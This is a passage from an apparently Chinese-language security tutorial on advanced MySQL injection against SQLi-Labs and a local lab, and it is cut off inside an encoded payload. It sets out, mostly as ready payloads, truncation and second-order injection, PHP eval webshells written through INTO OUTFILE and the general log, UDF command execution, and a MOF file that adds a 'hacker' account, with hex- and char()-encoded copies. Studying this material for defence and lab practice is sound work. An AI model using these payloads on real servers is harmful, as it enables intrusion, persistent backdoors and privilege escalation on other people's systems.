class="line">| id   | username             | password |</span><br><span class="line">+------+----------------------+----------+</span><br><span class="line">|    1 | admin                | aaaaaaaa |</span><br><span class="line">+------+----------------------+----------+</span><br><span class="line">1 row in set (0.02 sec)</span><br></pre></td></tr></table></figure>
<p>username的最大长度是20，可是我插入的明显超过20，而在使用select查询的时候，username超过的部分被截取掉了。</p>
<p>倘若现在有一个sql语句，它可以是完完全全的没有注入，但是如果允许空字符注册的话，那么就会导致我们今天的这个“<strong>长字符串截断注入</strong>”</p>
<p><code>select id,username,password from users where username = &#39;admin&#39;;</code></p>
<p>假设管理员的账号就是“admin”，那么我们就去注册一个“admin ”的用户。（PS:后面有哦很多空格哦，等待被截取掉就直接替换掉admin这个账号了）危害还是很大的。</p>
<h3 id="超长字符截断靶场复现"><a href="#超长字符截断靶场复现" class="headerlink" title="超长字符截断靶场复现"></a>超长字符截断靶场复现</h3><p>在这里使用SQLi-Labs第24关进行演示。</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/faQeIJ59dloznKN.png" alt="2003511573ceb082806180fa25fe5ab5.png"></p>
<p>注册用户名：admin x</p>
<p>注册密码：123456</p>
<p>查看数据库，可以看到新增用户为admin，密码为123456</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/AeX1dLM84ogvQlE.png" alt="e476c758349289994a637ae30c247986.png"></p>
<p>我们使用 用户名：admin，密码：123456 进行登录</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/K5cnb3vFGq1pWiX.png" alt="e6d78a5ad298d6acc1b88e3900497836.png"></p>
<p>成功登录</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/izyasOlLv49hJXS.png" alt="83359b1ee4f08aea03d80ad2818095a3.png"></p>
<p>不过这里登录的其实还是第2个admin用户，所以并不能通过此用户更改原admin的密码</p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="二次注入原理"><a href="#二次注入原理" class="headerlink" title="二次注入原理"></a>二次注入原理</h3><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>
<p><strong>二次注入，可以概括为以下两步:</strong></p>
<ul>
<li>第一步：插入恶意数据 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li>
<li>第二步：引用恶意数据 开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li>
</ul>
<p><img src="/img/gif/loading4.gif" data-original="https://upload-images.jianshu.io/upload_images/8581772-b024d9bb4acded26.png?imageMogr2/auto-orient/strip|imageView2/2/w/854/format/webp" alt="img"></p>
<h3 id="二次注入靶场复现"><a href="#二次注入靶场复现" class="headerlink" title="二次注入靶场复现"></a>二次注入靶场复现</h3><p>在这里使用SQLi-Labs第24关进行演示。</p>
<p>打开页面可以看到一个登陆界面，尝试用<code>admin&#39;#</code>进行注入，失败。</p>
<p><img src="/img/gif/loading4.gif" data-original="https://upload-images.jianshu.io/upload_images/8581772-f955882874b3b8e5.PNG?imageMogr2/auto-orient/strip|imageView2/2/w/897/format/webp" alt="img"></p>
<p>部分源代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>可以看到使用了<code>mysql_real_escape_string</code>进行转义处理，无法进行SQL注入。</p>
<p>继续研究，发现登陆页面可以进行用户注册，这里我们注册一个<code>admin&#39;#</code>的账号，登陆该账号后可以进行密码修改。</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/wpWX3nPFgtvb6HG.png" alt="e912e4b8aedd8e35cb1b73b1be333743.png"></p>
<p>注册新用户过程中的处理代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$username</span>=  mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line">    <span class="variable">$pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$re_pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysql_fetch_row(<span class="variable">$res</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//print_r($row);</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>[<span class="number">0</span>]== <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">        &lt;script&gt;alert(<span class="string">&quot;The username Already exists, Please choose a different username &quot;</span>)&lt;/script&gt;;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">        header(<span class="string">&#x27;refresh:1, url=new_user.php&#x27;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment"># Building up the query........</span></span><br><span class="line">                </span><br><span class="line">                <span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="subst">$username</span>\&quot;, \&quot;<span class="subst">$pass</span>\&quot;)&quot;</span>;</span><br><span class="line">                mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;Error Creating your user account,  : &#x27;</span>.mysql_error());</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">              ··················</span><br></pre></td></tr></table></figure>
<p>可以看到传入的<code>username</code>、<code>password</code>、<code>re_password</code>仍均被<code>mysql_escape_string</code>进行了转义处理，但是在数据库中还是插入了<code>admin&#39;#</code></p>
<p><img src="/img/gif/loading4.gif" data-original="https://upload-images.jianshu.io/upload_images/8581772-33fef276cb14df54.PNG?imageMogr2/auto-orient/strip|imageView2/2/w/245/format/webp" alt="img"></p>
<p>这是因为当数据写入到数据库的时候反斜杠会被移除，所以写入到数据库的内容就是原始数据，并不会在前面多了反斜杠。</p>
<p>这时，我们用<code>admin&#39;#</code>登陆，并进行密码修改，密码修改为<code>123456</code></p>
<p><img src="/img/gif/loading4.gif" data-original="https://upload-images.jianshu.io/upload_images/8581772-a7d9b6711a5b608a.PNG?imageMogr2/auto-orient/strip|imageView2/2/w/946/format/webp" alt="img"></p>
<p>执行后，查看数据库数据：</p>
<p><img src="/img/gif/loading4.gif" data-original="https://upload-images.jianshu.io/upload_images/8581772-11f6fd66afb30739.PNG?imageMogr2/auto-orient/strip|imageView2/2/w/224/format/webp" alt="img"></p>
<p>可以看到<code>admin</code>的密码由原来的<code>123</code>修改为<code>123456</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">这是因为上面的数据库更新语句，在用户名为 <span class="string">&quot;admin&#x27;#&quot;</span> 时执行的实际是：</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>
<p>因为我们将问题数据存储到了数据库，而程序再取数据库中的数据的时候没有进行二次判断便直接带入到代码中，从而造成了二次注入。</p>
<h2 id="利用SQL注入写WebShell"><a href="#利用SQL注入写WebShell" class="headerlink" title="利用SQL注入写WebShell"></a>利用SQL注入写WebShell</h2><p>写WebShell的必要条件就是拥有读写文件的权限。这个在讲带外查询的时候已经讲到过了，让我们再来回顾一下。</p>
<p>注：写Webshell之前需要知道Web根目录的绝对路径。</p>
<blockquote>
<p>获取Web根目录路径的方式：</p>
<ul>
<li>报错显示</li>
<li>遗留文件，phpinfo()</li>
<li>漏洞爆路径</li>
<li>读取配置文件</li>
</ul>
</blockquote>
<p>查看<code>secure_file_priv</code>变量的值</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>当secure_file_priv为空，就可以读取磁盘的目录。</p>
</li>
<li><p>当secure_file_priv为G:\，就可以读取G盘的文件。</p>
</li>
<li><p>当secure_file_priv为null，load_file就不能加载文件。</p>
</li>
</ul>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/7oWsbEFl9LuvDz1.png" alt="fb1da6930b6d134621129dd36805e0ca.png"></p>
<p>若该值为NULL，则需要在mysql的配置文件（my.ini）中设置 <code>secure_file_priv = &#39;&#39;</code></p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/wdQE7KR9AxsjghG.png" alt="3209f789243f97414ec5928f97478fa4.png"></p>
<p>若当前数据库用户没有读写文件权限，可以使用GRANT语句授予权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GRANT FILE ON *.* TO &#x27;user&#x27;@&#x27;%&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>
<p>注意：在Linux系统中，MySQL只是服务用户，默认没有对Web根目录有读写权限，除非能找到Web根目录下有对其他用户写入权限的目录才能写WebShell。</p>
<h3 id="利用Union-Select写入"><a href="#利用Union-Select写入" class="headerlink" title="利用Union Select写入"></a>利用Union Select写入</h3><p>这是最常见的写入方式，<code>union</code> 跟<code>select into outfile</code>，将一句话写入<code>evil.php</code>，仅适用于联合注入。</p>
<p>具体权限要求：<code>secure_file_priv</code>支持<code>web</code>目录文件导出、数据库用户File权限、获取物理路径。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;,3 into outfile &#x27;C:/Wamp/apache2.4/htdocs/WWW/evil.php&#x27; --+</span><br></pre></td></tr></table></figure>
<p>也可将一句话木马进行Hex编码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,0x3c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e,3 into outfile &#x27;C:/Wamp/apache2.4/htdocs/WWW/evil.php&#x27; --+</span><br></pre></td></tr></table></figure>
<p>这时，服务器的WEB根目录会多出一个<code>evil.php</code>的文件</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/vEIkStXAfrbBq4M.png" alt="b79e8369bd05be28c62563d03e6b1a97.png"></p>
<p>验证一句话木马能否成功执行命令</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/bHgSr2EWGaUMcdt.png" alt="b942d634209c5ed1ea971f002adb0490.png"></p>
<p>有关WebShell的内容在之后会详细讲解。</p>
<h3 id="利用分隔符写入"><a href="#利用分隔符写入" class="headerlink" title="利用分隔符写入"></a>利用分隔符写入</h3><p>当MySql注入的攻击方式为盲注或报错，<code>Union select</code>写入的方式显然是利用不了的，那么可以通过分隔符写入。<code>SQLMAP</code>的 <code>--os-shell</code>命令，所采用的就是一下这种方式。</p>
<p>具体权限要求：<code>secure_file_priv</code>支持<code>web</code>目录文件导出、数据库用户<code>File</code>权限、获取物理路径。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; limit 0,1 into outfile &#x27;C:/Wamp/apache2.4/htdocs/WWW/evil.php&#x27; lines terminated by 0x3c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e --+</span><br></pre></td></tr></table></figure>
<p>同样的技巧，一共有四种形式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines terminated by  	（一句话hex编码）#</span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; fields terminated by 	（一句话hex编码）#</span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; columns terminated by 	（一句话hex编码）#</span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines starting by    	（一句话hex编码）#</span><br></pre></td></tr></table></figure>
<h3 id="利用Log写入"><a href="#利用Log写入" class="headerlink" title="利用Log写入"></a>利用Log写入</h3><p>新版本的<code>MySQL</code>设置了导出文件的路径，很难在获取<code>Webshell</code>过程中去修改配置文件，无法通过使用<code>select into outfile</code>来写入一句话。这时，我们可以通过修改<code>MySQL</code>的<code>log</code>文件来获取<code>Webshell</code>。</p>
<p>具体权限要求：数据库用户需具备<code>Super</code>和<code>File</code>服务器权限、获取物理路径。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;; 		#查看配置</span><br><span class="line"></span><br><span class="line">set global general_log = on;			#开启general log模式</span><br><span class="line"></span><br><span class="line">set global general_log_file = &#x27;C:/Wamp/apache2.4/htdocs/WWW/evil.php&#x27;;	#设置日志目录为shell地址</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;;		#写入shell</span><br><span class="line"></span><br><span class="line">set global general_log=off;			#关闭general log模式</span><br></pre></td></tr></table></figure>
<h2 id="UDF提权执行系统命令"><a href="#UDF提权执行系统命令" class="headerlink" title="UDF提权执行系统命令"></a>UDF提权执行系统命令</h2><p><strong>什么是UDF?</strong></p>
<p>UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。</p>
<p><strong>如何使用UDF？</strong></p>
<ul>
<li>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</li>
<li>如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。</li>
<li>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。</li>
<li>拥有可以将udf.dll写入相应目录的权限。</li>
</ul>
<h3 id="上传udf动态链接库"><a href="#上传udf动态链接库" class="headerlink" title="上传udf动态链接库"></a>上传udf动态链接库</h3><p>如果是mysql5.1及以上版本，必须要把udf.dll文件放到mysql安装目录的lib\plugin文件夹下才能创建自定义函数。</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/3EfYS6chvKqUpOu.png" alt="babe58af0410a5eafe6deafbf1c33475.png"></p>
<p>在sqlmap中可以导入udf</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/Xv9lW4RHBgMp3b8.png" alt="img"></p>
<p>可以使用WebShell管理工具导入，这里就直接手工粘贴进去了</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/46NVe7cTSPitLy3.png" alt="013854ab7b29796f6a1e56e597e5d234.png"></p>
<h3 id="引用共享库文件创建存储函数"><a href="#引用共享库文件创建存储函数" class="headerlink" title="引用共享库文件创建存储函数"></a>引用共享库文件创建存储函数</h3><p>存储函数创建语法：</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/jO4lG1CgpuaNfTD.png" alt="image-20200704183408625"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;lib_mysqludf_sys.dll&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>只有两个变量，一个是function_name（函数名），我们想引入的函数是<code>sys\_eval</code>。还有一个变量是<code>shared\_library\_name</code>（共享包名称），即<code>lib_mysqludf_sys.dll</code>。</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/7cfCkNzYjZ9rJ5p.png" alt="d98f562a1bba6b244b906a1082acd262.png"></p>
<p>接下来我们就可以使用我们创建的<code>sys_eval()</code>函数执行系统命令了。</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/D2skxSNlTy5bzXZ.png" alt="7ec7d8ef81940a743c553ffb10b58936.png"></p>
<h2 id="MOF提权执行系统命令"><a href="#MOF提权执行系统命令" class="headerlink" title="MOF提权执行系统命令"></a>MOF提权执行系统命令</h2><h3 id="实验前准备"><a href="#实验前准备" class="headerlink" title="实验前准备"></a>实验前准备</h3><p><strong>介绍</strong></p>
<p>MOF文件是<code>mysql</code>数据库的扩展（<code>C:\WINDOWS\system32\wbem\mof</code>）叫做”托管对象格式”，其作用是每隔60s就会去监控进程创建和死亡，因为MOF文件每60s就会执行，且是系统权限，所以如果我们有权限替换原有的MOF文件，就能获得<strong>system</strong>权限。</p>
<p>执行成功写入MOF文件会出现在<code>C:\WINDOWS\system32\wbem\mof\good</code>目录下，否则出现在<code>C:\WINDOWS\system32\wbem\mof\bad</code>目录下。</p>
<p><strong>利用条件</strong></p>
<ul>
<li>Windows &lt;= 2003</li>
<li>拥有<code>mysql</code>数据库的账号，且账号有写入权限</li>
<li><code>mysql</code>在<code>C:\WINDOWS\system32\wbem\mof</code>目录有写入权限</li>
</ul>
<p><strong>实验环境</strong></p>
<ul>
<li><p>系统：Windows Server 2003 Enterprise x64 Edition</p>
</li>
<li><p>数据库：MySQL 5.1.52</p>
</li>
</ul>
<h3 id="有WebShell提权"><a href="#有WebShell提权" class="headerlink" title="有WebShell提权"></a>有WebShell提权</h3><p>新建一个user.mof文件，内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> namespace(<span class="meta-string">&quot;\\\\.\\root\\subscription&quot;</span>)</span></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = <span class="string">&quot;Root\\Cimv2&quot;</span>;</span><br><span class="line">Name = <span class="string">&quot;filtP2&quot;</span>;</span><br><span class="line">Query = <span class="string">&quot;Select * From __InstanceModificationEvent &quot;</span></span><br><span class="line"><span class="string">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span></span><br><span class="line"><span class="string">&quot;And TargetInstance.Second = 5&quot;</span>;</span><br><span class="line">QueryLanguage = <span class="string">&quot;WQL&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = <span class="string">&quot;consPCSV2&quot;</span>;</span><br><span class="line">ScriptingEngine = <span class="string">&quot;JScript&quot;</span>;</span><br><span class="line">ScriptText =</span><br><span class="line"><span class="string">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net user hacker Admin12345 /add\&quot;)&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>将该文件上传到目标主机中，然后执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;C:\\Wamp\\WebCode\\bWAPP_latest\\user.mof&#x27;) into dumpfile &#x27;C:\\WINDOWS\\system32\\wbem\\mof\\user.mof&#x27;;</span><br><span class="line"></span><br><span class="line">#注：这里只能用into dumpfile，这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行，所以我们用dumpfile导出一行数据。</span><br></pre></td></tr></table></figure>
<p>可以看到，成功执行了<code>net user hacker Admin12345 /add</code>命令，添加了一个hacker用户，接下来再用同样的方法执行<code>net localgroup administrators hacker /add</code>命令便可提权至管理员权限。</p>
<p><img src="/img/gif/loading4.gif" data-original="https://i.loli.net/2021/10/05/Ptv2C48fLVOmpy3.png" alt="image-20211005182707344"></p>
<h3 id="无WebShell提权"><a href="#无WebShell提权" class="headerlink" title="无WebShell提权"></a>无WebShell提权</h3><h4 id="16进制写入"><a href="#16进制写入" class="headerlink" title="16进制写入"></a>16进制写入</h4><p>写一个python脚本将evil.mof文件转化为16进制，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;evil.mof&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line">hex1 = binascii.hexlify(content)</span><br><span class="line"><span class="built_in">hex</span> = <span class="built_in">str</span>(hex1,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;0x&#x27;</span>+<span class="built_in">hex</span>)</span><br></pre></td></tr></table></figure>
<p>转化好之后再用sql语句写入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x23707261676d61206e616d65737061636528225c5c5c5c2e5c5c726f6f745c5c737562736372697074696f6e22290d0a696e7374616e6365206f66205f5f4576656e7446696c74657220617320244576656e7446696c7465720d0a7b0d0a4576656e744e616d657370616365203d2022526f6f745c5c43696d7632223b0d0a4e616d65203d202266696c745032223b0d0a5175657279203d202253656c656374202a2046726f6d205f5f496e7374616e63654d6f64696669636174696f6e4576656e7420220d0a22576865726520546172676574496e7374616e636520497361205c2257696e33325f4c6f63616c54696d655c2220220d0a22416e6420546172676574496e7374616e63652e5365636f6e64203d2035223b0d0a51756572794c616e6775616765203d202257514c223b0d0a7d3b0d0a696e7374616e6365206f66204163746976655363726970744576656e74436f6e73756d65722061732024436f6e73756d65720d0a7b0d0a4e616d65203d2022636f6e735043535632223b0d0a536372697074696e67456e67696e65203d20224a536372697074223b0d0a53637269707454657874203d0d0a2276617220575348203d206e657720416374697665584f626a656374285c22575363726970742e5368656c6c5c22295c6e5753482e72756e285c226e65742e6578652075736572206576696c204162636431323334202f6164645c2229223b0d0a7d3b0d0a696e7374616e6365206f66205f5f46696c746572546f436f6e73756d657242696e64696e670d0a7b0d0a436f6e73756d6572203d2024436f6e73756d65723b0d0a46696c746572203d20244576656e7446696c7465723b0d0a7d3b into dumpfile &#x27;C:\\WINDOWS\\system32\\wbem\\mof\\user.mof&#x27;;</span><br></pre></td></tr></table></figure>
<h4 id="ASCII写入"><a href="#ASCII写入" class="headerlink" title="ASCII写入"></a>ASCII写入</h4><p>写一个python脚本将evil.mof的文件内容转化为ascii码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;evil.mof&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    a = f.read()</span><br><span class="line">asc1 = np.frombuffer(a, dtype=np.uint8)</span><br><span class="line">asc = asc1.tolist()</span><br><span class="line"><span class="built_in">print</span>(asc)</span><br></pre></td></tr></table></figure>
<p>转化好之后再用sql语句写入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select char(35, 112, 114, 97, 103, 109, 97, 32, 110, 97, 109, 101, 115, 112, 97, 99, 101, 40, 34, 92, 92, 92, 92, 46, 92, 92, 114, 111, 111, 116, 92, 92, 115, 117, 98, 115, 99, 114, 105, 112, 116, 105, 111, 110, 34, 41, 13, 10, 105, 110, 115, 116, 97, 110, 99, 101, 32, 111, 102, 32, 95, 95, 69, 118, 101, 110, 116, 70, 105, 108, 116, 101, 114, 32, 97, 115, 32, 36, 69, 118, 101, 110, 116, 70, 105, 108, 116, 101, 114, 13, 10, 123, 13, 10, 69, 118, 101, 110, 116, 78, 97, 109, 101, 115, 112, 97, 99, 101, 32, 61, 32, 34, 82, 111, 111, 116, 92, 92, 67, 105, 109, 118, 50, 34, 59, 13, 10, 78, 97, 109, 101, 32, 61, 32, 34, 102, 105, 108, 116, 80, 50, 34, 59, 13, 10, 81, 117, 101, 114, 121, 32, 61, 32, 34, 83, 101, 108, 101, 99, 116, 32, 42, 32, 70, 114, 111, 109, 32, 95, 95, 73, 110, 115, 116, 97, 110, 99, 101, 77, 111, 100, 105, 102, 105, 99, 97, 116, 105, 111, 110, 69, 118, 101, 110, 116, 32, 34, 13, 10, 34, 87, 104, 101, 114, 101, 32, 84, 97, 114, 103, 101, 116, 73, 110, 115, 116, 97, 110, 99, 101, 32, 73, 115, 97, 32, 92, 34, 87, 105, 110, 51, 50, 95, 76, 111, 99, 97, 108, 84, 105, 109, 101, 92, 34, 32, 34, 13, 10, 34, 65, 110, 100, 32, 84, 97, 114, 103, 101, 116, 73, 110, 115, 116, 97, 110, 99, 101, 46, 83, 101, 99, 111, 110, 100, 32, 61, 32, 53, 34, 59, 13, 10, 81, 117, 101, 114, 121, 76, 97, 110, 103, 117, 97, 103, 101, 32, 61, 32, 34, 87, 81, 76, 34, 59, 13, 10, 125, 59, 13, 10, 105, 110, 115, 116, 97, 110, 99, 101, 32, 111, 102, 